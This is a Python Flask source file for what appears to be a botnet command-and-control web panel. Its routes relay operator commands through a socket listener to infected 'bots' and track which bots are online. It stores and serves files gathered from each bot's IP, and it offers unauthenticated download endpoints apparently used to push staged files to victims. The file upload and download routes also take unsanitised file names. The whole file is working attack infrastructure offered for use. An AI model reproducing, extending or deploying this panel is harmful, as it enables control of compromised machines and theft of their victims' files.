import os
from shutil import rmtree
from functools import wraps
from ast import literal_eval

from flask import render_template, session, redirect, request, flash, url_for, send_file, make_response
from werkzeug.security import check_password_hash, generate_password_hash
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

from project import app, db
from project.forms import Terminal, Login
from project.models import Bots, User
from project.socket_server import socket_host, socket_port


def login_only(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if 'logged' in session:
            return func(*args, **kwargs)
        else:
            return redirect(url_for('login'))
    return wrapper


@app.route('/login', methods=["GET", "POST"])
def login():
    form = Login()
    if request.method == "POST":
        user = User.query.filter_by(username=form.username.data).first()
        if user and check_password_hash(user.password, form.password.data):
            session['logged'] = True
            return redirect(url_for("index"))
        else:
            flash('Wrong login or password')
    return render_template("login.html", form=form)


@app.route('/logout')
@login_only
def logout():
    if "logged" in session:
        del session["logged"]
    return redirect(url_for("login"))


@app.route('/user/change', methods=["GET", "POST"])
@login_only
def change_password():
    form = Login()
    if request.method == "POST":
        user = User.query.filter_by(username=form.username.data).first()
        if user and check_password_hash(user.password, form.password.data):
            user.password = generate_password_hash(request.form['new_password'])
            db.session.commit()
            return redirect(url_for("index"))
        else:
            flash('Wrong login or password')
    return render_template("change_password.html", form=form)


def __connect_socket():
    host = (socket_host, socket_port)
    server = socket(AF_INET, SOCK_STREAM)
    server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 0)
    try:
        server.connect(host)
    except ConnectionRefusedError:
        return None
    return server


def __get_files():
    files = os.listdir('files')
    if not files:
        return None
    return files


def __add_line(line):
    with open('console-data.txt', 'a') as file:
        file.writelines(line + '\n')


def __get_data():
    with open('console-data.txt', 'r') as file:
        return file.readlines()


def __local_command_handler(command):
    if command == 'status':
        if __connect_socket():
            return '<span class="text-success">Listener is running</span>'
        else:
            return '<span class="text-danger">Listener is not running</span>'
    elif command == 'clear':
        open('console-data.txt', 'w').close()
        return '<span class="text-success">Cleared</span>'
    elif command == 'files':
        files = __get_files()
        if not files:
            files = "No one file was upload"
        return f'<span class="text-primary">{files}</span>'
    elif command == "help":
        return """<span class="text-secondary">
        Try "status" to show listener status<br>
        "show" to show online bots<br>
        "connect {ip}" to connect to bot<br>
        You can check documentation page for get more help</span>"""
    else:
        return False


@app.route('/', methods=["GET", "POST"])
@app.route('/index', methods=["GET", "POST"])
@login_only
def index():
    form = Terminal()
    if request.method == "POST":
        server = __connect_socket()
        command = form.command.data if form.command.data != 'check_bot_online' else 'help'
        __add_line(f"<span class='text-light'>~$ {command}</span>")
        response = __local_command_handler(command)
        if not response:
            try:
                server.send(bytes(command, "utf-8"))
                response = server.recv(1024).decode("utf-8")
            except ConnectionResetError:
                response = '<span class="text-danger">Listener was not running</span>'
        __add_line(response)
        form.command.data = ""
    return render_template("index.html", form=form, data=__get_data())


@app.route('/connect_to_bot/<string:ip>')
@login_only
def connect_to_bot(ip):
    server = __connect_socket()
    if server:
        server.send(f"connect {ip}".encode("utf-8"))
        response = server.recv(1024).decode("utf-8")
        __add_line(response)
    return redirect(url_for('index'))


@app.route('/board', methods=["GET", "POST"])
@login_only
def board():
    bots = Bots.get_all_bots()
    server = __connect_socket()
    if server and bots:
        server.send('check_bot_online'.encode())
        online_bots = server.recv(1024).decode('utf-8')
        if online_bots == 'No one bot':
            for bot in bots:
                bot.online = False
        else:
            online_bots = literal_eval(online_bots)
            for bot in bots:
                current = Bots.query.filter_by(id=bot.id).first()
                if current.ip in online_bots:
                    current.online = True
                    db.session.commit()
                else:
                    current.online = False
                    db.session.commit()
    return render_template("board.html", bots=bots)


@app.route('/bot_remove/<int:id>')
@login_only
def bot_remove(id):
    bot = Bots.get_bot_by_id(id)
    if os.path.exists(f"bots/{bot.ip}"):
        rmtree(f"bots/{bot.ip}")
    Bots.remove_bot_by_id(id)
    return redirect(url_for("board"))


@app.route('/bot_unfavorite/<int:id>')
@login_only
def bot_unfavorite(id):
    Bots.unfavorite_bot_by_id(id)
    return redirect(url_for("board"))


@app.route('/bot_favorite/<int:id>')
@login_only
def bot_favorite(id):
    Bots.favorite_bot_by_id(id)
    return redirect(url_for("board"))


@app.route('/bot/<int:id>')
@login_only
def bot_page(id):
    bot = Bots.get_bot_by_id(id)
    if os.path.exists(f'bots/{bot.ip}'):
        files = os.listdir(f'bots/{bot.ip}')
    else:
        files = None
    return render_template("bot.html", bot=bot, files=files)


@app.route('/download/file/<int:id>/<string:name>')
@login_only
def download_file(id, name):
    bot = Bots.get_bot_by_id(id)
    if os.path.exists(f"bots/{bot.ip}/{name}"):
        return send_file(f"../bots/{bot.ip}/{name}")
    flash("File not found")
    return redirect(f'/bot/{id}')


@app.route('/remove/file/<int:id>/<string:name>')
@login_only
def remove_file_bot(id, name):
    bot = Bots.get_bot_by_id(id)
    if os.path.exists(f"bots/{bot.ip}/{name}"):
        os.remove(f"bots/{bot.ip}/{name}")
        flash('<span class="text-success">Success</span>')
    else:
        flash('<span class="text-danger">File not found</span>')
    return redirect(f'/bot/{id}')


@app.route('/upload/file', methods=["GET", "POST"])
@login_only
def upload_file():
    files = __get_files()
    if request.method == 'POST':
        file = request.files['file']
        file.save(f'files/{file.filename}')
        flash("<span class='text-success'>Success</span>")
        return render_template('upload_file.html', files=files)
    return render_template('upload_file.html', files=files)


@app.route('/upload/file/download/<string:filename>')
def upload_file_download(filename):
    if os.path.exists(f'files/{filename}'):
        return send_file(f'../files/{filename}')
    flash('File not found')
    return redirect(url_for('upload_file'))


@app.route('/down/<string:filename>')
def download(filename):
    if os.path.exists(f'project/{filename}'):
        return send_file(f'../project/{filename}')
    return redirect(url_for('upload_file'))


@app.route('/remove/file/<string:filename>')
@login_only
def remove_file(filename):
    if os.path.exists(f'files/{filename}'):
        os.remove(f'files/{filename}')
        flash('<span class="text-success">Success</span>')
    return redirect(url_for('upload_file'))


@app.route('/documentation')
@login_only
def documentation():
    return render_template("documentation.html")
